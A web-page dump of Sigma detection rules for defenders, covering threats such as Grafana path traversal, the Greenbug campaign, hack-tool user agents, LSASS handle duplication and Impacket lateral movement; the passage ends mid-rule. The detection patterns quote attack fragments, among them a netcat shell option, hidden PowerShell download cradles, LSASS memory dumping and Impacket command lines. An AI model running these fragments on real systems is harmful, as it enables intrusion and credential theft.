<li><a href="#">title:Grafana Path Traversal Exploitation CVE-2021-43798 id: 7b72b328-5708-414f-9a2a-6a6867c26e16 status: experimental description: Detects a successful Grafana path traversal exploitation author: Florian Roth references: - - date: 2021/12/08 tags: - attack.initial_access - attack.t1190 logsource: category: webserver detection: selection_traversal: c-uri|contains: '/../../../../../../../' sc-status: 200 selection_plugins: c-uri|contains: - '/public/plugins/live' - '/public/plugins/icon' - '/public/plugins/loki' - '/public/plugins/text' - '/public/plugins/logs' - '/public/plugins/news' - '/public/plugins/stat' - '/public/plugins/mssql' - '/public/plugins/mixed' - '/public/plugins/mysql' - '/public/plugins/tempo' - '/public/plugins/graph' - '/public/plugins/gauge' - '/public/plugins/table' - '/public/plugins/debug' - '/public/plugins/zipkin' - '/public/plugins/jaeger' - '/public/plugins/geomap' - '/public/plugins/canvas' - '/public/plugins/grafana' - '/public/plugins/welcome' - '/public/plugins/xychart' - '/public/plugins/heatmap' - '/public/plugins/postgres' - '/public/plugins/testdata' - '/public/plugins/opentsdb' - '/public/plugins/influxdb' - '/public/plugins/barchart' - '/public/plugins/annolist' - '/public/plugins/bargauge' - '/public/plugins/graphite' - '/public/plugins/dashlist' - '/public/plugins/piechart' - '/public/plugins/dashboard' - '/public/plugins/nodeGraph' - '/public/plugins/alertlist' - '/public/plugins/histogram' - '/public/plugins/table-old' - '/public/plugins/pluginlist' - '/public/plugins/timeseries' - '/public/plugins/cloudwatch' - '/public/plugins/prometheus' - '/public/plugins/stackdriver' - '/public/plugins/alertGroups' - '/public/plugins/alertmanager' - '/public/plugins/elasticsearch' - '/public/plugins/gettingstarted' - '/public/plugins/state-timeline' - '/public/plugins/status-history' - '/public/plugins/grafana-clock-panel' - '/public/plugins/grafana-simple-json-datasource' - '/public/plugins/grafana-azure-monitor-datasource' condition: all of selection* fields: - c-ip - c-dns falsepositives: - Vulnerability scanners that scan a host that returns 200 status codes even in cases of a file not found or other error level: critical 
<li><a href="#">title:Granting Of Permissions To An Account id: a622fcd2-4b5a-436a-b8a2-a4171161833c status: test description: Identifies IPs from which users grant access to other users on azure resources and alerts when a previously unseen source IP address is used. author: sawwinnnaung references: - date: 2020/05/07 modified: 2021/11/27 logsource: product: azure service: azureactivity detection: keywords: - Microsoft.Authorization/roleAssignments/write condition: keywords falsepositives: - Valid change level: medium tags: - attack.t1098 
<li><a href="#">title:Greenbug Campaign Indicators id: 3711eee4-a808-4849-8a14-faf733da3612 status: test description: Detects tools and process executions as observed in a Greenbug campaign in May 2020 references: - author: Florian Roth date: 2020/05/20 modified: 2021/09/21 tags: - attack.g0049 - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1105 - attack.defense_evasion - attack.t1036.005 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'bitsadmin' - '/transfer' - 'CSIDL_APPDATA' selection2: CommandLine|contains: 'CSIDL_SYSTEM_DRIVE' selection3: CommandLine|contains: - '\msf.ps1' - '8989 -e cmd.exe' - 'system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill' - '-nop -w hidden -c $k=new-object' - '[Net.CredentialCache]::DefaultCredentials;IEX ' - ' -nop -w hidden -c $m=new-object net.webclient;$m' - '-noninteractive -executionpolicy bypass whoami' - '-noninteractive -executionpolicy bypass netstat -a' - 'L3NlcnZlcj1' # base64 encoded '/server=' selection4: Image|endswith: - '\adobe\Adobe.exe' - '\oracle\local.exe' - '\revshell.exe' - 'infopagesbackup\ncat.exe' - 'CSIDL_SYSTEM\cmd.exe' - '\programdata\oracle\java.exe' - 'CSIDL_COMMON_APPDATA\comms\comms.exe' - '\Programdata\VMware\Vmware.exe' condition: 1 of selection* falsepositives: - Unknown level: critical 
<li><a href="#">title:Group Modification Logging id: 9cf01b6c-e723-4841-a868-6d7f8245ca6e status: stable description: 'Configure systems to issue a log entry and alert when an account is added to or removed from any group assigned administrative privileges. Sigma detects\ \ Event ID 4728 indicates a \u2018Member is added to a Security Group\u2019. Event ID 4729 indicates a \u2018Member is removed from a Security enabled-group\u2019\ . Event ID 4730 indicates a\u2018Security Group is deleted\u2019. The case is not applicable for Unix OS. Supported OS - Windows 2008 R2 and 7, Windows 2012 R2\ \ and 8.1, Windows 2016 and 10 Windows Server 2019, Windows Server 2000, Windows 2003 and XP.' author: Alexandr Yampolskyi, SOC Prime date: 2019/03/26 references: - - - - - - - - - logsource: product: windows service: security detection: selection: EventID: - 4728 - 4729 - 4730 - 633 - 632 - 634 condition: selection falsepositives: - Unknown level: low # tags: # - CSC4 # - CSC4.8 # - NIST CSF 1.1 PR.AC-4 # - NIST CSF 1.1 PR.AT-2 # - NIST CSF 1.1 PR.MA-2 # - NIST CSF 1.1 PR.PT-3 # - ISO 27002-2013 A.9.1.1 # - ISO 27002-2013 A.9.2.2 # - ISO 27002-2013 A.9.2.3 # - ISO 27002-2013 A.9.2.4 # - ISO 27002-2013 A.9.2.5 # - ISO 27002-2013 A.9.2.6 # - ISO 27002-2013 A.9.3.1 # - ISO 27002-2013 A.9.4.1 # - ISO 27002-2013 A.9.4.2 # - ISO 27002-2013 A.9.4.3 # - ISO 27002-2013 A.9.4.4 # - PCI DSS 3.2 2.1 # - PCI DSS 3.2 7.1 # - PCI DSS 3.2 7.2 # - PCI DSS 3.2 7.3 # - PCI DSS 3.2 8.1 # - PCI DSS 3.2 8.2 # - PCI DSS 3.2 8.3 # - PCI DSS 3.2 8.7 
<li><a href="#">title:Guacamole Two Users Sharing Session Anomaly id: 1edd77db-0669-4fef-9598-165bda82826d status: test description: Detects suspicious session with two users present author: Florian Roth references: - date: 2020/07/03 modified: 2021/11/27 logsource: product: linux service: guacamole detection: selection: - '(2 users now present)' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1212 
<li><a href="#">title:GUI Input Capture - macOS id: 60f1ce20-484e-41bd-85f4-ac4afec2c541 status: experimental description: Detects attempts to use system dialog prompts to capture user credentials author: remotephone, oscd.community date: 2020/10/13 modified: 2021/12/02 references: - - logsource: product: macos category: process_creation detection: selection1: Image: '/usr/sbin/osascript' selection2: CommandLine|contains|all: - '-e' - 'display' - 'dialog' - 'answer' selection3: CommandLine|contains: - 'admin' - 'administrator' - 'authenticate' - 'authentication' - 'credentials' - 'pass' - 'password' - 'unlock' condition: all of selection* falsepositives: - Legitimate administration tools and activities level: low tags: - attack.credential_access - attack.t1056.002 
<li><a href="#">title:Hack Tool User Agent id: c42a3073-30fb-48ae-8c99-c23ada84b103 status: test description: Detects suspicious user agent strings user by hack tools in proxy logs author: Florian Roth references: - - date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent|contains: # Vulnerability scanner and brute force tools - '(hydra)' - ' arachni/' - ' BFAC ' - ' brutus ' - ' cgichk ' - 'core-project/1.0' - ' crimscanner/' - 'datacha0s' - 'dirbuster' - 'domino hunter' - 'dotdotpwn' - 'FHScan Core' - 'floodgate' - 'get-minimal' - 'gootkit auto-rooter scanner' - 'grendel-scan' - ' inspath ' - 'internet ninja' - 'jaascois' - ' zmeu ' - 'masscan' - ' metis ' - 'morfeus fucking scanner' - 'n-stealth' - 'nsauditor' - 'pmafind' - 'security scan' - 'springenwerk' - 'teh forest lobster' - 'toata dragostea' - ' vega/' - 'voideye' - 'webshag' - 'webvulnscan' - ' whcc/' # SQL Injection - ' Havij' - 'absinthe' - 'bsqlbf' - 'mysqloit' - 'pangolin' - 'sql power injector' - 'sqlmap' - 'sqlninja' - 'uil2pn' # Hack tool - 'ruler' # - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)' # SQLi Dumper condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.initial_access - attack.t1190 - attack.credential_access - attack.t1110 
<li><a href="#">title:Hacktool by Cube0x0 id: 37c1333a-a0db-48be-b64b-7393b2386e3b status: experimental description: Detects the use of tools created by a well-known hacktool producer named Cube0x0, which includes his handle in all binaries as company information in the PE headers (SharpPrintNightmare, KrbRelay, SharpMapExec etc.) author: Florian Roth references: - - date: 2022/04/27 logsource: category: process_creation product: windows detection: selection: Company: 'Cube0x0' condition: selection falsepositives: - Unlikely level: high 
<li><a href="#">title:Hacktool Ruler id: 24549159-ac1b-479c-8175-d42aea947cae description: This events that are generated when using the hacktool Ruler by Sensepost status: experimental author: Florian Roth date: 2017/05/31 modified: 2021/08/09 references: - - - - - tags: - attack.discovery - attack.execution - attack.t1087 - attack.t1114 - attack.t1059 - attack.t1550.002 logsource: product: windows service: security detection: selection1: EventID: 4776 Workstation: 'RULER' selection2: EventID: - 4624 - 4625 WorkstationName: 'RULER' condition: 1 of selection* falsepositives: - Go utilities that use staaldraad awesome NTLM library level: high 
<li><a href="#">title:Hacktool Service Registration or Execution id: d26ce60c-2151-403c-9a42-49420d87b5e4 status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Florian Roth date: 2022/03/21 references: - Internal Research tags: - attack.execution - attack.t1569.002 - attack.s0029 logsource: product: windows service: system detection: service: Provider_Name: 'Service Control Manager' EventID: - 7045 - 7036 selection: - ServiceName|contains: - 'WCESERVICE' - 'WCE SERVICE' - 'winexesvc' - 'DumpSvc' - 'pwdump' - 'gsecdump' - 'cachedump' - ImagePath|contains: - 'bypass' # condition: service and selection falsepositives: - Unknown level: high 
<li><a href="#">title:HandleKatz Duplicating LSASS Handle id: b1bd3a59-c1fd-4860-9f40-4dd161a7d1f5 description: Detects HandleKatz opening LSASS to duplicate its handle to later dump the memory without opening any new handles references: - status: experimental author: Bhabesh Raj (rule), @thefLinkk date: 2022/06/27 logsource: category: process_access product: windows detection: selection: TargetImage|endswith: '\lsass.exe' # Theoretically, can be any benign process holding handle to LSASS GrantedAccess: '0x1440' # Only PROCESS_DUP_HANDLE, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_QUERY_INFORMATION call_trace: # C:\Windows\SYSTEM32\ntdll.dll+9d234\|UNKNOWN(00000000001C119B) CallTrace|startswith: 'C:\Windows\System32\ntdll.dll+' CallTrace|contains: '|UNKNOWN(' CallTrace|endswith: ')' condition: selection and call_trace falsepositives: - Unknown level: high tags: - attack.execution - attack.t1106 - attack.defense_evasion - attack.t1003.001 
<li><a href="#">title:Harvesting of Wifi Credentials Using netsh.exe id: 42b1a5b8-353f-4f10-b256-39de4467faff status: test description: Detect the harvesting of wifi credentials using netsh.exe author: Andreas Hunkeler (@Karneades), oscd.community references: - date: 2020/04/20 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\netsh.exe' CommandLine|contains|all: - 'wlan' - ' s' - ' p' - ' k' - '=clear' condition: selection falsepositives: - Legitimate administrator or user uses netsh.exe wlan functionality for legitimate reason level: medium tags: - attack.discovery - attack.credential_access - attack.t1040 
<li><a href="#">title:Hermetic Wiper TG Process Patterns id: 2f974656-6d83-4059-bbdf-68ac5403422f status: experimental description: This rule detects process execution patterns found in intrusions related to the Hermetic Wiper malware attacks against Ukraine in February 2022 author: Florian Roth references: - date: 2022/02/25 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\policydefinitions\postgresql.exe' selection2: - CommandLine|contains: - 'CSIDL_SYSTEM_DRIVE\temp\sys.tmp' - ' 1> \\127.0.0.1\ADMIN$\__16' - CommandLine|contains|all: - 'powershell -c ' - '\comsvcs.dll MiniDump ' - '\winupd.log full' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:HH.exe Execution id: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84 status: test description: Identifies usage of hh.exe executing recently modified .chm files. author: E.M. Anhaus (originally from Atomic Blue Detections, Dan Beavin), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\hh.exe' CommandLine|contains: '.chm' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unlikely level: high tags: - attack.defense_evasion - attack.t1218.001 
<li><a href="#">title:Hidden Files and Directories id: d08722cd-3d09-449a-80b4-83ea2d9d4616 description: Detects adversary creating hidden file or directory, by detecting directories or files with . as the first character author: 'Pawel Mazur' status: experimental date: 2021/09/06 references: - - logsource: product: linux service: auditd detection: commands: type: EXECVE a0: - mkdir - touch - vim - nano - vi arguments: - a1|contains: '/.' - a1|startswith: '.' - a2|contains: '/.' - a2|startswith: '.' condition: commands and arguments tags: - attack.defense_evasion - attack.t1564.001 falsepositives: - Unknown level: low 
<li><a href="#">title:Hidden Local User Creation id: 7b449a5e-1db5-4dd0-a2dc-4e3a67282538 description: Detects the creation of a local hidden user account which should not happen for event ID 4720. status: experimental tags: - attack.persistence - attack.t1136.001 references: - author: Christian Burkard date: 2021/05/03 logsource: product: windows service: security detection: selection: EventID: 4720 TargetUserName|endswith: '$' condition: selection fields: - EventCode - AccountName falsepositives: - Unknown level: high 
<li><a href="#">title:Hidden Powershell in Link File Pattern id: 30e92f50-bb5a-4884-98b5-d20aa80f3d7a status: experimental description: Detects events that appear when a user click on a link file with a powershell command in it author: frack113 date: 2022/02/06 references: - logsource: category: process_creation product: windows detection: selection: ParentImage: C:\Windows\explorer.exe Image: C:\Windows\System32\cmd.exe CommandLine|contains|all: - 'powershell' - '.lnk' condition: selection falsepositives: - Legitimate commands in .lnk files level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Hidden User Creation id: b22a5b36-2431-493a-8be1-0bae56c28ef3 status: test description: Detects creation of a hidden user account on macOS (UserID < 500) or with IsHidden option author: Daniil Yugoslavskiy, oscd.community references: - date: 2020/10/10 modified: 2021/11/27 logsource: category: process_creation product: macos detection: dscl_create: Image|endswith: '/dscl' CommandLine|contains: 'create' id_below_500: CommandLine|contains: UniqueID CommandLine|re: '([0-9]|[1-9][0-9]|[1-4][0-9]{2})' ishidden_option_declaration: CommandLine|contains: 'IsHidden' ishidden_option_confirmation: CommandLine|contains: - 'true' - 'yes' - '1' condition: dscl_create and id_below_500 or dscl_create and (ishidden_option_declaration and ishidden_option_confirmation) falsepositives: - Legitimate administration activities level: medium tags: - attack.defense_evasion - attack.t1564.002 
<li><a href="#">title:Hiding Files with Attrib.exe id: 4281cb20-2994-4580-aa63-c8b86d019934 status: test description: Detects usage of attrib.exe to hide files from users. author: Sami Ruohonen date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\attrib.exe' CommandLine|contains: ' +h ' ini: CommandLine|contains: '\desktop.ini ' intel: ParentImage|endswith: '\cmd.exe' CommandLine: +R +H +S +A \\*.cui ParentCommandLine: C:\WINDOWS\system32\\*.bat condition: selection and not (ini or intel) fields: - CommandLine - ParentCommandLine - User falsepositives: - IgfxCUIService.exe hiding *.cui files via .bat script (attrib.exe a child of cmd.exe and igfxCUIService.exe is the parent of the cmd.exe) - Msiexec.exe hiding desktop.ini level: low tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:High DNS Bytes Out id: 0f6c1bf5-70a5-4963-aef9-aab1eefb50bd status: experimental description: High DNS queries bytes amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 logsource: category: dns detection: selection: query: '*' timeframe: 1m condition: selection falsepositives: - Legitimate high DNS bytes out rate to domain name which should be added to whitelist level: medium 
<li><a href="#">title:High DNS Bytes Out id: 3b6e327d-8649-4102-993f-d25786481589 status: experimental description: High DNS queries bytes amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 logsource: category: firewall detection: selection: dst_port: 53 timeframe: 1m condition: selection falsepositives: - Legitimate high DNS bytes out rate to domain name which should be added to whitelist level: medium 
<li><a href="#">title:High DNS Requests Rate id: 51186749-7415-46be-90e5-6914865c825a status: experimental description: High DNS requests amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 logsource: category: firewall detection: selection: dst_port: 53 timeframe: 1m condition: selection falsepositives: - Legitimate high DNS requests rate to domain name which should be added to whitelist level: medium 
<li><a href="#">title:High DNS Requests Rate id: b4163085-4001-46a3-a79a-55d8bbbc7a3a status: experimental description: High DNS requests amount from host per short period of time author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/09/21 tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 logsource: category: dns detection: selection: query: '*' timeframe: 1m condition: selection falsepositives: - Legitimate high DNS requests rate to domain name which should be added to whitelist level: medium 
<li><a href="#">title:High Integrity Sdclt Process id: 40f9af16-589d-4984-b78d-8c2aec023197 status: test description: A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: 'sdclt.exe' IntegrityLevel: 'High' condition: selection falsepositives: - Unknown level: medium tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 
<li><a href="#">title:High NULL Records Requests Rate id: 44ae5117-9c44-40cf-9c7c-7edad385ca70 status: test description: Extremely high rate of NULL record type DNS requests from host per short period of time. Possible result of iodine tool execution author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: 'NULL' timeframe: 1m condition: selection falsepositives: - Legitimate high DNS NULL requests rate to domain name which should be added to whitelist level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:High TXT Records Requests Rate id: f0a8cedc-1d22-4453-9c44-8d9f4ebd5d35 status: test description: Extremely high rate of TXT record type DNS requests from host per short period of time. Possible result of Do-exfiltration tool execution author: Daniil Yugoslavskiy, oscd.community date: 2019/10/24 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: 'TXT' timeframe: 1m condition: selection falsepositives: - Legitimate high DNS TXT requests rate to domain name which should be added to whitelist level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 
<li><a href="#">title:Highly Relevant Renamed Binary id: 0ba1da6d-b6ce-4366-828c-18826c9de23e status: test description: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. author: Matthew Green - @mgreen27, Florian Roth references: - - - date: 2019/06/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - 'powershell.exe' - 'powershell_ise.exe' - 'psexec.exe' - 'psexec.c' # old versions of psexec (2016 seen) - 'cscript.exe' - 'wscript.exe' - 'mshta.exe' - 'regsvr32.exe' - 'wmic.exe' - 'certutil.exe' - 'rundll32.exe' - 'cmstp.exe' - 'msiexec.exe' filter: Image|endswith: - '\powershell.exe' - '\powershell_ise.exe' - '\psexec.exe' - '\psexec64.exe' - '\cscript.exe' - '\wscript.exe' - '\mshta.exe' - '\regsvr32.exe' - '\wmic.exe' - '\certutil.exe' - '\rundll32.exe' - '\cmstp.exe' - '\msiexec.exe' condition: selection and not filter falsepositives: - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist level: high tags: - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Hijack Legit RDP Session to Move Laterally id: 52753ea4-b3a0-4365-910d-36cff487b789 status: test description: Detects the usage of tsclient share to place a backdoor on the RDP source machine's startup folder author: Samir Bousseaden date: 2019/02/21 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: Image|endswith: '\mstsc.exe' TargetFilename|contains: '\Microsoft\Windows\Start Menu\Programs\Startup\' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:History File Deletion id: 1182f3b3-e716-4efa-99ab-d2685d04360f status: experimental description: Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity author: Florian Roth references: - date: 2022/06/20 logsource: category: process_creation product: linux detection: selection: Image|endswith: '/rm' selection_history: - CommandLine|contains: - '/.bash_history' - '/.zsh_history' - CommandLine|endswith: '_history' condition: all of selection* falsepositives: - Legitimate administration activities level: high tags: - attack.impact - attack.t1565.001 
<li><a href="#">title:Host Without Firewall id: 6b2066c8-3dc7-4db7-9db0-6cc1d7b0dde9 status: stable description: Host Without Firewall. Alert means not complied. Sigma for Qualys vulnerability scanner. Scan type - Vulnerability Management. author: Alexandr Yampolskyi, SOC Prime date: 2019/03/19 modified: 2021/05/30 references: - - - logsource: product: qualys detection: selection: event.category: Security Policy host.scan.vuln_name: Firewall Product Not Detected* condition: selection level: low # tags: # - CSC9 # - CSC9.4 # - NIST CSF 1.1 PR.AC-5 # - NIST CSF 1.1 PR.AC-6 # - NIST CSF 1.1 PR.AC-7 # - NIST CSF 1.1 DE.AE-1 # - ISO 27002-2013 A.9.1.2 # - ISO 27002-2013 A.13.2.1 # - ISO 27002-2013 A.13.2.2 # - ISO 27002-2013 A.14.1.2 # - PCI DSS 3.2 1.4 
<li><a href="#">title:HTML Help Shell Spawn id: 52cad028-0ff0-4854-8f67-d25dfcbc78b4 status: test description: Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm) author: Maxim Pavlunin references: - date: 2020/04/01 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage: 'C:\Windows\hh.exe' Image|endswith: - '\cmd.exe' - '\powershell.exe' - '\wscript.exe' - '\cscript.exe' - '\regsvr32.exe' - '\wmic.exe' - '\rundll32.exe' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1218.001 - attack.t1218.010 - attack.t1218.011 - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.t1059.005 - attack.t1059.007 - attack.t1047 
<li><a href="#">title:Hurricane Panda Activity id: 0eb2107b-a596-422e-b123-b389d5594ed7 status: test description: Detects Hurricane Panda Activity author: Florian Roth references: - date: 2019/03/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - CommandLine|contains|all: - 'localgroup' - 'admin' - '/add' - CommandLine|contains: - '\Win64.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.privilege_escalation - attack.g0009 - attack.t1068 
<li><a href="#">title:HybridConnectionManager Service Installation id: 0ee4d8a5-4e67-4faf-acfa-62a78457d1f2 description: Rule to detect the Hybrid Connection Manager service installation. status: experimental date: 2021/04/12 modified: 2021/08/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - logsource: product: windows service: security detection: selection: EventID: 4697 ServiceName: HybridConnectionManager ServiceFileName|contains: HybridConnectionManager condition: selection falsepositives: - Legitimate use of Hybrid Connection Manager via Azure function apps. level: high 
<li><a href="#">title:HybridConnectionManager Service Installation id: ac8866c7-ce44-46fd-8c17-b24acff96ca8 description: Detects the installation of the Azure Hybrid Connection Manager service to allow remote code execution from Azure function. status: experimental date: 2021/04/12 modified: 2022/01/13 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.resource_development - attack.t1608 references: - logsource: category: registry_event product: windows detection: selection1: TargetObject|contains: '\Services\HybridConnectionManager' selection2: EventType: SetValue Details|contains: 'Microsoft.HybridConnectionManager.Listener.exe' condition: selection1 or selection2 falsepositives: - Unknown level: high 
<li><a href="#">title:HybridConnectionManager Service Running id: b55d23e5-6821-44ff-8a6e-67218891e49f description: Rule to detect the Hybrid Connection Manager service running on an endpoint. status: experimental date: 2021/04/12 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - logsource: product: windows service: microsoft-servicebus-client detection: selection: EventID: - 40300 - 40301 - 40302 keywords: - 'HybridConnection' - 'sb://' - 'servicebus.windows.net' - 'HybridConnectionManage' condition: selection and keywords falsepositives: - Legitimate use of Hybrid Connection Manager via Azure function apps. level: high 
<li><a href="#">title:Hydra Password Guessing Hack Tool id: aaafa146-074c-11eb-adc1-0242ac120002 status: test description: Detects command line parameters used by Hydra password guessing hack tool author: Vasiliy Burov references: - - date: 2020/10/05 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - '-u ' - '-p ' selection2: CommandLine|contains: - '^USER^' - '^PASS^' condition: selection1 and selection2 falsepositives: - Software that uses the caret encased keywords PASS and USER in its command line level: high tags: - attack.credential_access - attack.t1110 - attack.t1110.001 
<li><a href="#">title:IE Change Domain Zone id: 45e112d0-7759-4c2a-aa36-9f8fb79d3393 description: Hides the file extension through modification of the registry author: frack113 date: 2022/01/22 modified: 2022/04/04 status: experimental references: - - logsource: category: registry_set product: windows detection: selection_domains: EventType: SetValue TargetObject|contains: \SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\ filter: Details: - DWORD (0x00000000) # My Computer - DWORD (0x00000001) # Local Intranet Zone - '(Empty)' condition: selection_domains and not filter falsepositives: - Administrative scripts level: medium tags: - attack.persistence - attack.t1137 
<li><a href="#">title:Ie4uinit Lolbin Use From Invalid Path id: d3bf399f-b0cf-4250-8bb4-dfc192ab81dc status: experimental description: Detect use of ie4uinit.exe to execute commands from a specially prepared ie4uinit.inf file from a directory other than the usual directories references: - - author: frack113 date: 2022/05/07 modified: 2022/05/16 logsource: product: windows category: process_creation detection: lolbin: - Image|endswith: '\ie4uinit.exe' - OriginalFileName: 'IE4UINIT.EXE' filter_correct: CurrentDirectory: - 'c:\windows\system32\' - 'c:\windows\sysWOW64\' filter_missing: CurrentDirectory: null condition: lolbin and not 1 of filter_* falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:IIS Native-Code Module Command Line Installation id: 9465ddf4-f9e4-4ebd-8d98-702df3a93239 status: test description: Detects suspicious IIS native-code module installations via command line author: Florian Roth references: - date: 2019/12/11 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\appcmd.exe' CommandLine|contains|all: - 'install' - 'module' - '/name:' condition: selection falsepositives: - Unknown as it may vary from organisation to arganisation how admins use to install IIS modules level: medium tags: - attack.persistence - attack.t1505.003 
<li><a href="#">title:Ilasm Lolbin Use Compile C-Sharp id: 850d55f9-6eeb-4492-ad69-a72338f65ba4 status: experimental description: Detect use of Ilasm.exe to compile c# code into dll or exe. references: - - author: frack113 date: 2022/05/07 modified: 2022/05/16 logsource: product: windows category: process_creation detection: selection: - Image|endswith: '\ilasm.exe' - OriginalFileName: 'ilasm.exe' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Image Load of VSS_PS.dll by Uncommon Executable id: 333cdbe8-27bb-4246-bf82-b41a0dca4b70 status: experimental description: Detects the image load of vss_ps.dll by uncommon executables using OriginalFileName datapoint author: Markus Neis, @markus_neis date: 2021/07/07 modified: 2022/06/02 references: - 1bd85e1caa1415ebdc8852c91e37bbb7 - tags: - attack.defense_evasion - attack.impact - attack.t1490 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: '\vss_ps.dll' filter: Image|endswith: - '\svchost.exe' - '\msiexec.exe' - '\vssvc.exe' - '\srtasks.exe' - '\tiworker.exe' - '\dllhost.exe' - '\searchindexer.exe' - '\dismhost.exe' - '\taskhostw.exe' - '\clussvc.exe' - '\thor64.exe' - '\thor.exe' - '\rundll32.exe' - '\inetsrv\iissetup.exe' - '\inetsrv\appcmd.exe' Image|contains: 'c:\windows\' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Impacket Lateralization Detection id: 10c14723-61c7-4c75-92ca-9af245723ad2 status: stable description: Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework author: Ecco, oscd.community, Jonhnathan Ribeiro references: - - - - date: 2019/09/03 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection_other: # *** wmiexec.py # parent is wmiprvse.exe # examples: # cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1567439113.54 2>&1 # cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__1567439113.54 2>&1 # *** dcomexec.py -object MMC20 # parent is mmc.exe # example: # "C:\Windows\System32\cmd.exe" /Q /c cd 1> \\127.0.0.1\ADMIN$\__1567442499.05 2>&1 # *** dcomexec.py -object ShellBrowserWindow # runs %SystemRoot%\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {c08afd90-f2a1-11d1-8455-00a0c91f3880} but parent command is explorer.exe # example: # "C:\Windows\System32\cmd.exe" /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1567520103.71 2>&1 # *** smbexec.py # parent is services.exe # example: # C:\Windows\system32\cmd.exe /Q /c echo tasklist ^> \\127.0.0.1\C$\__output 2^>^&1 > C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & del C:\Windows\TEMP\execute.bat ParentImage|endswith: - '\wmiprvse.exe' # wmiexec - '\mmc.exe' # dcomexec MMC - '\explorer.exe' # dcomexec ShellBrowserWindow - '\services.exe' # smbexec CommandLine|contains|all: - 'cmd.exe' - '/Q' - '/c' - '\\\\127.0.0.1\' - '&1' selection_atexec: ParentCommandLine|contains: - 'svchost.exe -k netsvcs' # atexec on win10 (parent is "C:\Windows\system32\svchost.exe -k netsvcs") - 'taskeng.exe' # atexec on win7 (parent is "taskeng.exe {AFA79333-694C-4BEE-910E-E57D9A3518F6} S-1-5-18:NT AUTHORITY\System:Service:") # cmd.exe /C tasklist /m > C:\Windows\Temp\bAJrYQtL.tmp 2>&1 CommandLine|contains|all: - 'cmd.exe' - '/C' - 'Windows\Temp\' - '&1' condition: 1 of selection_* fields: - CommandLine - 